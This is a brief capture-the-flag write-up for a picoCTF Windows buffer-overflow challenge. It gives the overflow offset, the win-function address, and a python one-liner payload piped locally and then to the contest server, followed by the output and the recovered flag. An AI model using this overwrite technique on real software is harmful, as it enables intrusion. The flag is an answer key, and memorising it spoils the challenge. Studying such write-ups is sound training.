# Exp

# Flag: picoCTF{Un_v3rr3_d3_v1n_1f5c0001}

Using EDB we get offset of 140

Win function address is 00401530

python2.7 -c "print('A' * 140 + '\x30\x15\x40\x00')" | wine vuln.exe
Give me a string!
Flag File is Missing. Problem is Misconfigured, please contact an Admin if running on picoCTF servers.

Works locally !

python2.7 -c "print('A' * 140 + '\x30\x15\x40\x00')" | nc saturn.picoctf.net 63460
Give me a string!
picoCTF{Un_v3rr3_d3_v1n_1f5c0001}
Unhandled exception: page fault on read access to 0x7fec3900 in 32-bit code (0x7fec3900).
Register dump:
